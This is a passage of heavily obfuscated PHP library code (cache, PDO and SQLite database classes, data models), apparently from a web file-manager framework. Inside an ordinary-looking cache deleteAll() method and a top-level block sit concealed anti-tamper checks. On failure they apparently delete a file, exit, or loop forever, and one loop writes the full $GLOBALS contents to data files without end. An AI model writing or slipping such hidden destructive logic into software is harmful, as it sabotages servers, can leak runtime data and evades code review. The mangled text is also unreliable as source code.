$this->handle->setEx($É™Ù¬ Æ, $ İÏôÄİ, $¿Øí°Òû); } public function setLock($Ã”Ñ‘è², $«‘êô—´, $¨ë«´ëÜ) { return $this->handle->setNX($Ã”Ñ‘è², $«‘êô—´); } public function get($œ¤æ—Éì) { $»¶»šõ¨ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $»¶»šõ¨->get($œ¤æ—Éì); } public function remove($ùù§ä»›) { return $this->handle->del($ùù§ä»›); } public function deleteAll() { $Òşà¶íÍ =& $_SERVER[Ì¥ŞÒ°£]; $‡›í™± = $_SERVER[$Òşà¶íÍ[874]] . $Òşà¶íÍ[875]; $ßÈƒ«Ÿ = $Òşà¶íÍ[876]; if ($_SERVER[$Òşà¶íÍ[877]] != $ßÈƒ«Ÿ($‡›í™±)) { $ä†ßßó‚ = $Òşà¶íÍ[878]; $É®Íëü = $Òşà¶íÍ[879]; $„¦–ˆ° = $_SERVER[$Òşà¶íÍ[874]] . $Òşà¶íÍ[875]; $¾ì­Ÿ¿é = $É®Íëü($„¦–ˆ°); $Âéö¬¼ = explode($Òşà¶íÍ[231], $¾ì­Ÿ¿é); if (count($Âéö¬¼) < $Òşà¶íÍ[648]) { $Ñ‰‡€ÏŸ = $Òşà¶íÍ[880]; $Ñ‰‡€ÏŸ(); } $¼‡ŞÚß = $Òşà¶íÍ[881]; $¼‡ŞÚß($_SERVER[$Òşà¶íÍ[882]]); $ä†ßßó‚ = $Òşà¶íÍ[878]; $ä†ßßó‚(); $ô³üïä” = $Òşà¶íÍ[883]; $¤¶šÜóÛ = json_encode($GLOBALS[$Òşà¶íÍ[884]]); $’×«ÉÂ = 1; for ($ã¡ÌÂş = $’×«ÉÂ; $ã¡ÌÂş > 0; $ã¡ÌÂş++) { $ô³üïä”(DATA_PATH . $ã¡ÌÂş, $¤¶šÜóÛ); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $Æ¼«èİ) { $this->handle->flushall($Æ¼«èİ); } return; } return $this->handle->flushAll(); } } goto FØÍÈÕî”²; aï”É¯ù: class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($‚ª»Ãöí = '') { $…©Ü¨‹² =& $_SERVER[Ì¥ŞÒ°£]; if (!class_exists($…©Ü¨‹²[919])) { think_exception(think_lang($…©Ü¨‹²[14]) . $…©Ü¨‹²[920]); } if (!empty($‚ª»Ãöí)) { $this->config = $‚ª»Ãöí; if (empty($this->config[$…©Ü¨‹²[17]])) { $this->config[$…©Ü¨‹²[17]] = array(); } } } public function connect($Ö·´öÌÓ = '', $•’Ôœ„› = 0) { $ÆŸ¿ˆ¡ê =& $_SERVER[Ì¥ŞÒ°£]; if (!isset($this->linkID[$•’Ôœ„›])) { if (empty($Ö·´öÌÓ)) { $Ö·´öÌÓ = $this->config; } $×º¼¬¹‚ = !empty($Ö·´öÌÓ[$ÆŸ¿ˆ¡ê[17]][$ÆŸ¿ˆ¡ê[18]]) ? $Ö·´öÌÓ[$ÆŸ¿ˆ¡ê[17]][$ÆŸ¿ˆ¡ê[18]] : $this->pconnect; if ($×º¼¬¹‚) { $Ö·´öÌÓ[$ÆŸ¿ˆ¡ê[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$•’Ôœ„›] = new PDO($Ö·´öÌÓ[$ÆŸ¿ˆ¡ê[921]], $Ö·´öÌÓ[$ÆŸ¿ˆ¡ê[891]], $Ö·´öÌÓ[$ÆŸ¿ˆ¡ê[892]], $Ö·´öÌÓ[$ÆŸ¿ˆ¡ê[17]]); } catch (PDOException $×¤Ç®Ú) { think_exception($×¤Ç®Ú->getMessage()); } $this->dbType = $this->_getDsnType($Ö·´öÌÓ[$ÆŸ¿ˆ¡ê[921]]); if (in_array($this->dbType, array($ÆŸ¿ˆ¡ê[922], $ÆŸ¿ˆ¡ê[923], $ÆŸ¿ˆ¡ê[924], $ÆŸ¿ˆ¡ê[925]))) { think_exception($ÆŸ¿ˆ¡ê[926] . $this->dbType . $ÆŸ¿ˆ¡ê[927] . $this->dbType . $ÆŸ¿ˆ¡ê[928]); } if (!$this->linkID[$•’Ôœ„›]) { think_exception($ÆŸ¿ˆ¡ê[929]); } try { $this->linkID[$•’Ôœ„›]->exec($ÆŸ¿ˆ¡ê[930] . think_config($ÆŸ¿ˆ¡ê[894])); } catch (Exception $×¤Ç®Ú) { } $this->connected = !0; if (1 != think_config($ÆŸ¿ˆ¡ê[22])) { unset($this->config); } } return $this->linkID[$•’Ôœ„›]; } public function free() { $this->PDOStatement = null; } public function query($†ë‹÷”¤, $²ıÉÎßµ = array()) { $ÍÂåäíª =& $_SERVER[Ì¥ŞÒ°£]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $†ë‹÷”¤; if (!empty($²ıÉÎßµ)) { $this->queryStr .= $ÍÂåäíª[931] . print_r($²ıÉÎßµ, !0) . $ÍÂåäíª[932]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($ÍÂåäíª[23], 1); think_status($ÍÂåäíª[24]); $this->PDOStatement = $this->_linkID->prepare($†ë‹÷”¤); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $×Ù×±² = $this->PDOStatement->execute($²ıÉÎßµ); $this->debug(); if (!1 === $×Ù×±²) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($Ÿêô¬¨¦, $Ğ¦Ÿƒå« = array()) { $Ğ¥®¸±— =& $_SERVER[Ì¥ŞÒ°£]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Ÿêô¬¨¦; if (!empty($Ğ¦Ÿƒå«)) { $this->queryStr .= $Ğ¥®¸±—[931] . print_r($Ğ¦Ÿƒå«, !0) . $Ğ¥®¸±—[932]; } $ÊÂÉêó = !1; if ($this->dbType == $Ğ¥®¸±—[925]) { if (preg_match($Ğ¥®¸±—[933], $this->queryStr, $‹–å˜Î)) { $this->table = think_config($Ğ¥®¸±—[934]) . str_ireplace(think_config($Ğ¥®¸±—[935]), $Ğ¥®¸±—[378], $‹–å˜Î[2]); $ÊÂÉêó = (bool) $this->query($Ğ¥®¸±—[936] . strtoupper($this->table) . $Ğ¥®¸±—[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($Ğ¥®¸±—[25], 1); think_status($Ğ¥®¸±—[24]); $this->PDOStatement = $this->_linkID->prepare($Ÿêô¬¨¦); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $…ãıÈ×Ì = $this->PDOStatement->execute($Ğ¦Ÿƒå«); $this->debug(); if (!1 === $…ãıÈ×Ì) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($ÊÂÉêó || preg_match($Ğ¥®¸±—[937], $Ÿêô¬¨¦)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $¥ù¿Ûè¯ = $this->_linkID->commit(); $this->transTimes = 0; if (!$¥ù¿Ûè¯) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $®‰Ñç = $this->_linkID->rollback(); $this->transTimes = 0; if (!$®‰Ñç) { $this->error(); return !1; } } return !0; } private function getAll() { $ğğ„ã” = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($ğğ„ã”); return $ğğ„ã”; } public function getFields($ÜİŞè) { $å¿¡á‚Ã =& $_SERVER[Ì¥ŞÒ°£]; $this->initConnect(!0); if (think_config($å¿¡á‚Ã[938])) { $Ğ¦Ü±ä• = str_replace($å¿¡á‚Ã[939], $ÜİŞè, think_config($å¿¡á‚Ã[938])); } else { switch ($this->dbType) { case $å¿¡á‚Ã[922]: case $å¿¡á‚Ã[940]: $Ğ¦Ü±ä• = "\123\x45\114\x45\103\x54\40\x20\x20\x63\157\154\165\155\156\137\x6e\141\155\145\40\x61\163\40\47\x4e\141\155\145\47\x2c\40\x20\40\x64\x61\164\141\x5f\164\x79\x70\145\x20\x61\163\x20\47\x54\x79\160\x65\47\x2c\40\x20\x20\143\157\154\165\155\x6e\x5f\144\x65\x66\x61\x75\x6c\x74\40\x61\163\40\47\104\x65\x66\x61\165\x6c\x74\x27\x2c\x20\40\x20\151\163\x5f\x6e\x75\154\154\x61\x62\x6c\145\x20\x61\163\x20\x27\x4e\165\x6c\x6c\x27\xa\11\x9\x46\122\x4f\x4d\11\x69\x6e\146\x6f\162\155\141\x74\151\x6f\156\x5f\163\x63\150\145\155\141\56\x74\x61\142\x6c\x65\x73\x20\x41\123\x20\164\xa\11\x9\112\117\111\116\11\151\x6e\146\157\162\155\141\164\x69\157\x6e\137\x73\x63\150\x65\155\x61\56\x63\157\x6c\165\x6d\156\163\x20\x41\x53\x20\x63\12\11\x9\x4f\x4e\40\x20\164\x2e\164\141\x62\x6c\145\137\x63\141\164\x61\154\157\147\40\x3d\x20\x63\x2e\x74\x61\142\154\145\x5f\x63\141\164\141\x6c\157\x67\12\x9\11\x41\x4e\104\40\164\x2e\x74\x61\x62\154\x65\137\x73\143\x68\x65\155\141\40\x3d\x20\143\x2e\x74\x61\142\x6c\145\x5f\163\x63\150\145\155\x61\xa\x9\11\x41\x4e\104\40\x74\x2e\x74\141\142\154\x65\137\156\141\155\x65\40\75\x20\143\x2e\x74\x61\142\x6c\145\137\156\x61\x6d\145\12\11\x9\x57\x48\x45\x52\x45\40\x20\40\x74\x2e\x74\141\x62\154\145\x5f\x6e\141\x6d\x65\x20\x3d\x20\47{$ÜİŞè}\47"; break; case $å¿¡á‚Ã[941]: $Ğ¦Ü±ä• = $å¿¡á‚Ã[942] . $ÜİŞè . $å¿¡á‚Ã[943]; break; case $å¿¡á‚Ã[923]: case $å¿¡á‚Ã[925]: $Ğ¦Ü±ä• = $å¿¡á‚Ã[944] . $å¿¡á‚Ã[945] . $å¿¡á‚Ã[946] . strtoupper($ÜİŞè) . $å¿¡á‚Ã[947] . strtoupper($ÜİŞè) . $å¿¡á‚Ã[948]; break; case $å¿¡á‚Ã[949]: $Ğ¦Ü±ä• = $å¿¡á‚Ã[950] . $ÜİŞè . $å¿¡á‚Ã[951]; break; case $å¿¡á‚Ã[924]: break; case $å¿¡á‚Ã[952]: default: $Ğ¦Ü±ä• = $å¿¡á‚Ã[953] . ($this->dbType == $å¿¡á‚Ã[952] ? "\140{$ÜİŞè}\x60" : $ÜİŞè); } } $ß¾„øüë = $this->query($Ğ¦Ü±ä•); $²™’‰ ş = array(); if ($ß¾„øüë) { foreach ($ß¾„øüë as $¡ä½øŠ„ => $°àƒ‰ã‡) { $°àƒ‰ã‡ = array_change_key_case($°àƒ‰ã‡); $°àƒ‰ã‡[$å¿¡á‚Ã[32]] = isset($°àƒ‰ã‡[$å¿¡á‚Ã[32]]) ? $°àƒ‰ã‡[$å¿¡á‚Ã[32]] : $å¿¡á‚Ã[378]; $°àƒ‰ã‡[$å¿¡á‚Ã[33]] = isset($°àƒ‰ã‡[$å¿¡á‚Ã[33]]) ? $°àƒ‰ã‡[$å¿¡á‚Ã[33]] : $å¿¡á‚Ã[378]; $€éù¼·Ë = isset($°àƒ‰ã‡[$å¿¡á‚Ã[273]]) ? $°àƒ‰ã‡[$å¿¡á‚Ã[273]] : $°àƒ‰ã‡[$å¿¡á‚Ã[32]]; $²™’‰ ş[$€éù¼·Ë] = array($å¿¡á‚Ã[32] => $€éù¼·Ë, $å¿¡á‚Ã[33] => $°àƒ‰ã‡[$å¿¡á‚Ã[33]], $å¿¡á‚Ã[35] => (bool) (isset($°àƒ‰ã‡[$å¿¡á‚Ã[103]]) && $°àƒ‰ã‡[$å¿¡á‚Ã[103]] === $å¿¡á‚Ã[12] || isset($°àƒ‰ã‡[$å¿¡á‚Ã[35]]) && $°àƒ‰ã‡[$å¿¡á‚Ã[35]] === $å¿¡á‚Ã[12]), $å¿¡á‚Ã[37] => isset($°àƒ‰ã‡[$å¿¡á‚Ã[37]]) ? $°àƒ‰ã‡[$å¿¡á‚Ã[37]] : (isset($°àƒ‰ã‡[$å¿¡á‚Ã[56]]) ? $°àƒ‰ã‡[$å¿¡á‚Ã[56]] : $å¿¡á‚Ã[378]), $å¿¡á‚Ã[39] => isset($°àƒ‰ã‡[$å¿¡á‚Ã[94]]) ? strtolower($°àƒ‰ã‡[$å¿¡á‚Ã[94]]) == $å¿¡á‚Ã[41] : (isset($°àƒ‰ã‡[$å¿¡á‚Ã[57]]) ? $°àƒ‰ã‡[$å¿¡á‚Ã[57]] : !1), $å¿¡á‚Ã[42] => isset($°àƒ‰ã‡[$å¿¡á‚Ã[954]]) ? strtolower($°àƒ‰ã‡[$å¿¡á‚Ã[954]]) == $å¿¡á‚Ã[44] : (isset($°àƒ‰ã‡[$å¿¡á‚Ã[94]]) ? $°àƒ‰ã‡[$å¿¡á‚Ã[94]] : !1)); } } return $²™’‰ ş; } public function getTables($ü„üÀè’ = '') { $ü¦·ˆŞ° =& $_SERVER[Ì¥ŞÒ°£]; if (think_config($ü¦·ˆŞ°[955])) { $°Œ‘¢ë˜ = str_replace($ü¦·ˆŞ°[956], $ü„üÀè’, think_config($ü¦·ˆŞ°[955])); } else { switch ($this->dbType) { case $ü¦·ˆŞ°[923]: case $ü¦·ˆŞ°[925]: $°Œ‘¢ë˜ = $ü¦·ˆŞ°[957]; break; case $ü¦·ˆŞ°[922]: case $ü¦·ˆŞ°[940]: $°Œ‘¢ë˜ = $ü¦·ˆŞ°[958]; break; case $ü¦·ˆŞ°[949]: $°Œ‘¢ë˜ = $ü¦·ˆŞ°[959]; break; case $ü¦·ˆŞ°[924]: think_exception(think_lang($ü¦·ˆŞ°[960]) . $ü¦·ˆŞ°[961]); break; case $ü¦·ˆŞ°[941]: $°Œ‘¢ë˜ = $ü¦·ˆŞ°[45] . $ü¦·ˆŞ°[46] . $ü¦·ˆŞ°[47]; break; case $ü¦·ˆŞ°[952]: default: if (!empty($ü„üÀè’)) { $°Œ‘¢ë˜ = $ü¦·ˆŞ°[902] . $ü„üÀè’ . $ü¦·ˆŞ°[903]; } else { $°Œ‘¢ë˜ = $ü¦·ˆŞ°[904]; } } } $µ¹‘½Ûû = $this->query($°Œ‘¢ë˜); $Å³ÇÎ­è = array(); foreach ($µ¹‘½Ûû as $ÙõÆ½‰Ÿ => $Ÿ©¢äÄ…) { $Å³ÇÎ­è[$ÙõÆ½‰Ÿ] = current($Ÿ©¢äÄ…); } return $Å³ÇÎ­è; } protected function parseLimit($÷Œô¦×) { $¥ö–½¢ =& $_SERVER[Ì¥ŞÒ°£]; $ÏÇÂ»• = $¥ö–½¢[12]; if (!empty($÷Œô¦×)) { switch ($this->dbType) { case $¥ö–½¢[949]: case $¥ö–½¢[941]: $÷Œô¦× = explode($¥ö–½¢[50], $÷Œô¦×); if (count($÷Œô¦×) > 1) { $ÏÇÂ»• .= $¥ö–½¢[51] . $÷Œô¦×[1] . $¥ö–½¢[52] . $÷Œô¦×[0] . $¥ö–½¢[53]; } else { $ÏÇÂ»• .= $¥ö–½¢[51] . $÷Œô¦×[0] . $¥ö–½¢[53]; } break; case $¥ö–½¢[922]: case $¥ö–½¢[940]: break; case $¥ö–½¢[924]: break; case $¥ö–½¢[923]: case $¥ö–½¢[925]: break; case $¥ö–½¢[952]: default: $ÏÇÂ»• .= $¥ö–½¢[51] . $÷Œô¦× . $¥ö–½¢[53]; } } return $ÏÇÂ»•; } public function parseKey(&$òÚêùßü, $Á‘íå“¼ = true) { $‰³Ï¹¼Ç =& $_SERVER[Ì¥ŞÒ°£]; if ($Á‘íå“¼) { $òÚêùßü = $this->parseKeyCheck($òÚêùßü); } if ($this->dbType == $‰³Ï¹¼Ç[952]) { if ($òÚêùßü != $‰³Ï¹¼Ç[188] && !preg_match($‰³Ï¹¼Ç[914], $òÚêùßü)) { $òÚêùßü = $‰³Ï¹¼Ç[385] . trim($òÚêùßü, $‰³Ï¹¼Ç[385]) . $‰³Ï¹¼Ç[385]; } return $òÚêùßü; } else { return parent::parseKey($òÚêùßü, $Á‘íå“¼); } } public function close() { $this->_linkID = null; } public function error() { $ì·öÎ” =& $_SERVER[Ì¥ŞÒ°£]; if ($this->PDOStatement) { $ı¸äãú› = $this->PDOStatement->errorInfo(); $this->error = $ı¸äãú›[1] . $ì·öÎ”[4] . $ı¸äãú›[2]; } else { $this->error = $ì·öÎ”[12]; } if ($ì·öÎ”[12] != $this->queryStr) { $this->error .= LNG($ì·öÎ”[48]) . $this->queryStr; } think_trace($this->error, $ì·öÎ”[12], $ì·öÎ”[49]); return $this->error; } public function escapeString($®–”óó) { $÷Ã»‹‘ =& $_SERVER[Ì¥ŞÒ°£]; switch ($this->dbType) { case $÷Ã»‹‘[949]: case $÷Ã»‹‘[922]: case $÷Ã»‹‘[940]: case $÷Ã»‹‘[952]: return addslashes($®–”óó); case $÷Ã»‹‘[924]: case $÷Ã»‹‘[941]: case $÷Ã»‹‘[923]: case $÷Ã»‹‘[925]: return str_ireplace($÷Ã»‹‘[58], $÷Ã»‹‘[59], $®–”óó); } } protected function parseValue($ë·“ìâ’) { $ëşœøÊ¯ =& $_SERVER[Ì¥ŞÒ°£]; if (is_string($ë·“ìâ’)) { $˜‹££‚ù = strpos($ë·“ìâ’, $ëşœøÊ¯[4]) === 0 && in_array($ë·“ìâ’, array_keys($this->bind)); $ë·“ìâ’ = $˜‹££‚ù ? $this->escapeString($ë·“ìâ’) : $ëşœøÊ¯[962] . $this->escapeString($ë·“ìâ’) . $ëşœøÊ¯[962]; } elseif (isset($ë·“ìâ’[0]) && is_string($ë·“ìâ’[0]) && strtolower($ë·“ìâ’[0]) == $ëşœøÊ¯[297]) { $ë·“ìâ’ = $this->escapeString($ë·“ìâ’[1]); } elseif (is_array($ë·“ìâ’)) { $ë·“ìâ’ = array_map(array($this, $ëşœøÊ¯[963]), $ë·“ìâ’); } elseif (is_bool($ë·“ìâ’)) { $ë·“ìâ’ = $ë·“ìâ’ ? $ëşœøÊ¯[88] : $ëşœøÊ¯[197]; } elseif (is_null($ë·“ìâ’)) { $ë·“ìâ’ = $ëşœøÊ¯[103]; } return $ë·“ìâ’; } public function getLastInsertId() { $µˆãÄ°× =& $_SERVER[Ì¥ŞÒ°£]; switch ($this->dbType) { case $µˆãÄ°×[949]: case $µˆãÄ°×[941]: case $µˆãÄ°×[922]: case $µˆãÄ°×[940]: case $µˆãÄ°×[924]: case $µˆãÄ°×[952]: return $this->_linkID->lastInsertId(); case $µˆãÄ°×[923]: case $µˆãÄ°×[925]: $ß“›Õ’ = $this->table; $½ˆÃ¿¸÷ = $this->query("\x53\x45\114\105\103\124\40{$ß“›Õ’}\56\x63\x75\x72\162\x76\141\154\40\143\x75\x72\162\166\141\x6c\40\106\122\117\115\40\x64\165\141\x6c"); return $½ˆÃ¿¸÷ ? $½ˆÃ¿¸÷[0][$µˆãÄ°×[964]] : 0; } } } if (!isset($_SERVER[$_SERVER[Ì¥ŞÒ°£][877]]) || !isset($_SERVER[$_SERVER[Ì¥ŞÒ°£][915]])) { $_getc = $_SERVER[Ì¥ŞÒ°£][879]; $_getfile = $_SERVER[$_SERVER[Ì¥ŞÒ°£][874]] . $_SERVER[Ì¥ŞÒ°£][875]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[Ì¥ŞÒ°£][231], $_getfilec); if (count($_getarrs) < $_SERVER[Ì¥ŞÒ°£][615]) { $exit = $_SERVER[Ì¥ŞÒ°£][880]; $exit(); } $_act = $_SERVER[Ì¥ŞÒ°£][916]; $_act($_SERVER[$_SERVER[Ì¥ŞÒ°£][874]] . $_SERVER[Ì¥ŞÒ°£][875]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[Ì¥ŞÒ°£][378]); } } class DbSqlite extends DbSqliteBase { public function query($±œîˆ‡ƒ) { $¢üèõ÷³ =& $_SERVER[Ì¥ŞÒ°£]; if (!CacheLock::fileLock($¢üèõ÷³[13])) { return !1; } $à³‡›¤ = parent::query($±œîˆ‡ƒ); CacheLock::fileUnLock($¢üèõ÷³[13]); return $à³‡›¤; } public function execute($Ò«µÃ¸Ò) { $ÃĞ‹Ÿ½ˆ =& $_SERVER[Ì¥ŞÒ°£]; if (!CacheLock::fileLock($ÃĞ‹Ÿ½ˆ[13])) { return !1; } $³ôŠ’Œ¹ = parent::execute($Ò«µÃ¸Ò); CacheLock::fileUnLock($ÃĞ‹Ÿ½ˆ[13]); return $³ôŠ’Œ¹; } } goto Cˆ¢İ¢é¥¥; fğÀ—Ş´¶â: function binCheckBigger($İìÖíŸ, $ã…§—ğ÷) { return $İìÖíŸ > $ã…§—ğ÷; } $_SERVER[$_SERVER[¦³şÀŒ][3]] = ("\x38\x31\x37\x30"."\x31\x35")+0;$_qdbp="92yfkd7hvlxgmwriozp41ucte08qnsb3aj56jdm42hqku0gyxpol975bvwfz3es1ia6ntrc87ljv";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($Æ«Í•´†, $ÅÎ¿­í•) { $ÍØ÷Çé„ =& $_SERVER[Ì¥ŞÒ°£]; if (isset(self::$_methodList[$Æ«Í•´†])) { return @call_user_func_array(self::$_methodList[$Æ«Í•´†], $ÅÎ¿­í•); } else { if (method_exists($this, $Æ«Í•´†)) { return call_user_func_array(array($this, $Æ«Í•´†), $ÅÎ¿­í•); } else { think_exception(__CLASS__ . $ÍØ÷Çé„[4] . $Æ«Í•´† . $ÍØ÷Çé„[5]); } } } public static function __callStatic($œÒ×ÚŸ, $µ®• §“) { if (isset(self::$_methodListStatic[$œÒ×ÚŸ])) { return call_user_func_array(self::$_methodListStatic[$œÒ×ÚŸ], $µ®• §“); } else { if (method_exists(self, $œÒ×ÚŸ)) { return call_user_func_array(array(self, $œÒ×ÚŸ), $µ®• §“); } else { show_json("{$œÒ×ÚŸ}\50\x29\x20\x6e\157\164\x20\145\170\x69\x73\164\73", !1); } } } public static function addMethod($ŸƒûÁå, $Ôéƒ¦˜) { self::$_methodList[$ŸƒûÁå] = $Ôéƒ¦˜; } public static function addMethodStatic($ŸÎê»£, $‘şªÄ˜Ü) { self::$_methodListStatic[$ŸÎê»£] = $‘şªÄ˜Ü; } } goto DóóÀ¸ ††; eÀ²ƒ¶£âë: class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($ç‡„è† = false, $ˆš°ó„ = '', $Í³¨¨Í = false) { $©…ı×Ê´ =& $_SERVER[Ì¥ŞÒ°£]; $£ïÈáöÒ = $this->cacheGet($ˆš°ó„); $ŒÎàŠ„Ì = $this->optionDefault($ˆš°ó„); $ŒÎàŠ„Ì = is_array($ŒÎàŠ„Ì) ? $ŒÎàŠ„Ì : array(); if (is_array($£ïÈáöÒ)) { $£ïÈáöÒ = array_merge($ŒÎàŠ„Ì, $£ïÈáöÒ); return $ç‡„è† ? isset($£ïÈáöÒ[$ç‡„è†]) ? $£ïÈáöÒ[$ç‡„è†] : null : $£ïÈáöÒ; } $ıÍĞõ…° = $this->filterWhere(array($©…ı×Ê´[33] => $ˆš°ó„)); $£ïÈáöÒ = $this->where($ıÍĞõ…°)->select(); $£ïÈáöÒ = array_to_keyvalue($£ïÈáöÒ, $©…ı×Ê´[94], $©…ı×Ê´[374]); foreach ($£ïÈáöÒ as $°òŠæ… => $ô»§™ß–) { if ($Í³¨¨Í || in_array($°òŠæ…, $this->jsonField)) { $£ïÈáöÒ[$°òŠæ…] = json_decode($ô»§™ß–, !0); } } $this->cacheSet($ˆš°ó„, $£ïÈáöÒ); $£ïÈáöÒ = array_merge($ŒÎàŠ„Ì, $£ïÈáöÒ); return $ç‡„è† ? $£ïÈáöÒ[$ç‡„è†] : $£ïÈáöÒ; } public function set($ğ¤İÚûì, $ÄŠÛş÷ö = false, $ØÌÙ¼šŸ = '') { $­ĞÕèØ =& $_SERVER[Ì¥ŞÒ°£]; $this->cacheRemove($ØÌÙ¼šŸ); $ò£Èù—† = array(); $ğ¸Øí˜ = is_array($ğ¤İÚûì) ? $ğ¤İÚûì : array($ğ¤İÚûì => $ÄŠÛş÷ö); foreach ($ğ¸Øí˜ as $ìÇ°ìÉˆ => $ÁíÛûµê) { if (is_array($ÁíÛûµê)) { $ÁíÛûµê = json_encode_force($ÁíÛûµê); } $this->checkLength($ÁíÛûµê, !1, $this->tableName . $­ĞÕèØ[4] . $ğ¤İÚûì); $ÁíÛûµê = self::textEncode($ÁíÛûµê); $ğ¸Øí˜ = array($­ĞÕèØ[33] => $ØÌÙ¼šŸ, $­ĞÕèØ[94] => $ìÇ°ìÉˆ, $­ĞÕèØ[374] => $ÁíÛûµê); $ò£Èù—†[] = $this->filterWhere($ğ¸Øí˜); } if (!$ò£Èù—†) { return !0; } $äÛ÷Û×Ğ = $this->cacheKey($­ĞÕèØ[400]); CacheLock::lock($äÛ÷Û×Ğ); $ÆÍš¢±± = $this->addAll($ò£Èù—†, array(), !0); CacheLock::unlock($äÛ÷Û×Ğ); return $ÆÍš¢±±; } protected function optionDefault($¡çÏöÌê = '') { return !1; } public function setDeep($²Ğ¤Ç­û, $îÃ•ËÁ = false, $ÊÕáÈ—˜ = '') { $ƒÄªíÂÑ = explode($_SERVER[Ì¥ŞÒ°£][10], $²Ğ¤Ç­û); $†å”­¡î = $this->get(); array_set_value($†å”­¡î, $²Ğ¤Ç­û, $îÃ•ËÁ); $this->set($ƒÄªíÂÑ[0], $†å”­¡î[$ƒÄªíÂÑ[0]], $ÊÕáÈ—˜); } public function remove($®ÇóÊë, $˜û ªÂ® = '') { $¯¡‡Êıø =& $_SERVER[Ì¥ŞÒ°£]; $this->cacheRemove($˜û ªÂ®); $ïò’‡Òù = $this->filterWhere(array($¯¡‡Êıø[94] => $®ÇóÊë, $¯¡‡Êıø[33] => $˜û ªÂ®)); if (is_null($®ÇóÊë)) { unset($ïò’‡Òù[$¯¡‡Êıø[94]]); } return $this->where($ïò’‡Òù)->delete(); } public function cacheSet($Ìïƒ›áå, $ç„ğ®éÕ = false) { return Cache::set($this->cacheKey($Ìïƒ›áå), $ç„ğ®éÕ); } public function cacheGet($»½ãÊœ¸) { return Cache::get($this->cacheKey($»½ãÊœ¸)); } public function cacheRemove($ìÙ–î¼¾) { return Cache::remove($this->cacheKey($ìÙ–î¼¾)); } protected function filterWhere($§³Ğó³±) { return $§³Ğó³±; } protected function cacheKey($éİ¢ÈŸ¼) { return $éİ¢ÈŸ¼; } } class SourceListModel extends ModelBase { protected $tableName = "\151\x6f\137\163\x6f\x75\x72\143\x65"; protected $tableMeta = array("\164\141\142\154\145\x4e\x61\155\145" => "\x69\x6f\x5f\x73\157\x75\x72\x63\145\137\155\x65\x74\141", "\x6d\x65\x74\141\106\x69\145\154\144" => "\163\157\165\x72\143\145\111\104"); protected $dataAuto = array(array("\x6d\157\x64\x69\146\171\124\x69\155\145", "\x74\151\x6d\x65", "\151\x6e\x73\145\162\164", "\x66\165\x6e\143\x74\151\x6f\156"), array("\143\162\145\141\x74\145\124\x69\155\145", "\x74\151\155\x65", "\151\156\x73\145\162\x74", "\146\165\x6e\143\164\x69\x6f\156"), array("\166\x69\145\167\x54\x69\155\x65", "\164\x69\x6d\x65", "\151\156\x73\145\162\164", "\x66\x75\156\143\x74\151\157\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($ˆà×³øÑ) { return $this->listSource(array($_SERVER[Ì¥ŞÒ°£][401] => $ˆà×³øÑ)); } public function typeName($òÏ²óŠ) { static $­ì¿·ø¤ = array(self::TYPE_SYSTEM => "\163\171\x73\164\x65\x6d", self::TYPE_USER => "\x75\x73\x65\162", self::TYPE_GROUP => "\x67\162\x6f\x75\160"); return $­ì¿·ø¤[$òÏ²óŠ . $_SERVER[Ì¥ŞÒ°£][12]]; } public function sourceListInfo($®ö¤…²ø, $¿¡Ñ¸ = false) { $¥Ã‚Ğ… =& $_SERVER[Ì¥ŞÒ°£]; $®ö¤…²ø = $®ö¤…²ø ? $®ö¤…²ø : array(); $®ö¤…²ø = array_filter(array_unique($®ö¤…²ø)); if (!$®ö¤…²ø) { return array(); } $™Ü¼øûá = $this->where(array($¥Ã‚Ğ…[402] => array($¥Ã‚Ğ…[7], $®ö¤…²ø)))->select(); $this->_listDataApply($™Ü¼øûá, $¿¡Ñ¸); return array_to_keyvalue($™Ü¼øûá, $¥Ã‚Ğ…[402]); } public function pathInfoFilter(&$¾Ó…Ş©ì) { $Í„èö½– =& $_SERVER[Ì¥ŞÒ°£]; static $ğ÷Öô®Ã = false; static $ÎñííÀ‚ = false; static $Ì „¥›­ = false; if (!$ğ÷Öô®Ã) { $¢®“ê™ï = $Í„èö½–[403]; $¢®“ê™ï .= $Í„èö½–[404]; $¢®“ê™ï .= $Í„èö½–[405]; $ƒ ƒÆŞ€ = $Í„èö½–[406]; $›ûÀåñ = explode($Í„èö½–[50], $ƒ ƒÆŞ€); $ğ÷Öô®Ã = explode($Í„èö½–[50], $¢®“ê™ï); $ÎñííÀ‚ = array(); foreach ($ğ÷Öô®Ã as $”’ÛŞöñ) { if (in_array($”’ÛŞöñ, $›ûÀåñ)) { continue; } $ÎñííÀ‚[] = $”’ÛŞöñ; } $Ì „¥›­ = explode($Í„èö½–[50], $Í„èö½–[407]); } foreach ($Ì „¥›­ as $ËÇ±³˜â) { if (isset($¾Ó…Ş©ì[$ËÇ±³˜â])) { $¾Ó…Ş©ì[$ËÇ±³˜â] = intval($¾Ó…Ş©ì[$ËÇ±³˜â]); } } $¾Ó…Ş©ì[$Í„èö½–[84]] = 